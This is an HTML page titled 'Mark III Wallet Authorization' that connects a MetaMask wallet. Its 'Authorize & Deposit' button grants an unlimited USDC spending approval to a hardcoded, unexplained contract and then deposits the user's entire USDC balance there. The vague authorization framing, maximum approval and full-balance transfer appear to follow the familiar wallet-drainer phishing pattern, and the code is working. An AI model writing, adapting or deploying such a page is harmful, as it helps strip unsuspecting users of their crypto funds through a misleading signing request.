<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mark III Wallet Authorization</title>
  <style>
    :root {
      --primary: #4e44ce;
      --error: #ff4444;
      --success: #00C851;
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f8f9fa;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    button {
      padding: 12px 24px;
      margin: 8px;
      border: none;
      border-radius: 8px;
      background: var(--primary);
      color: white;
      cursor: pointer;
    }
    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    #status {
      margin-top: 20px;
      padding: 12px;
      border-radius: 8px;
      background: white;
      max-width: 500px;
      word-break: break-word;
    }
    .error {
      color: var(--error);
    }
    .success {
      color: var(--success);
    }
  </style>
</head>
<body>
  <h2>Mark III Wallet Authorization</h2>
  
  <button id="connect">Connect Wallet</button>
  <button id="authorize" disabled>Authorize & Deposit</button>
  
  <div id="status">Status: Connect your wallet</div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    // Configuration
    const CONFIG = {
      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC Mainnet
      CONTRACT_ADDRESS: "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12",
      ABI: [
        "function deposit(uint256 amount) external",
        "function approve(address,uint256) returns (bool)",
        "function balanceOf(address) view returns (uint256)"
      ]
    };

    // DOM Elements
    const connectBtn = document.getElementById('connect');
    const authorizeBtn = document.getElementById('authorize');
    const statusEl = document.getElementById('status');

    // State
    let provider, signer, user;

    // Initialize
    connectBtn.onclick = connectWallet;

    async function connectWallet() {
      try {
        if (!window.ethereum) throw new Error("Please install MetaMask");
        
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        user = await signer.getAddress();
        
        updateUI();
        statusEl.textContent = `Connected: ${user}`;
        
      } catch (err) {
        showError(err);
      }
    }

    function updateUI() {
      connectBtn.disabled = true;
      authorizeBtn.disabled = false;
      authorizeBtn.onclick = handleDeposit;
    }

    async function handleDeposit() {
      try {
        // 1. Initialize USDC contract
        const usdc = new ethers.Contract(
          CONFIG.USDC_ADDRESS,
          [
            "function approve(address,uint256) returns (bool)",
            "function balanceOf(address) view returns (uint256)"
          ],
          signer
        );
        
        // 2. Get user's USDC balance
        statusEl.textContent = "Fetching USDC balance...";
        const balance = await usdc.balanceOf(user);
        
        // 3. Approve max amount
        statusEl.textContent = "Approving USDC (max amount)...";
        const approveTx = await usdc.approve(
          CONFIG.CONTRACT_ADDRESS, 
          ethers.constants.MaxUint256 // MAX APPROVAL
        );
        await approveTx.wait();
        
        // 4. Deposit full balance
        statusEl.textContent = `Depositing ${ethers.utils.formatUnits(balance, 6)} USDC...`;
        const contract = new ethers.Contract(
          CONFIG.CONTRACT_ADDRESS,
          CONFIG.ABI,
          signer
        );
        const depositTx = await contract.deposit(balance); // Use actual balance
        await depositTx.wait();
        
        statusEl.textContent = `âœ… Success! Deposited ${ethers.utils.formatUnits(balance, 6)} USDC`;
        statusEl.className = 'success';
        
      } catch (err) {
        showError(err);
      }
    }

    function showError(err) {
      console.error(err);
      statusEl.textContent = `Error: ${err.message}`;
      statusEl.className = 'error';
    }
  </script>
</body>
</html>
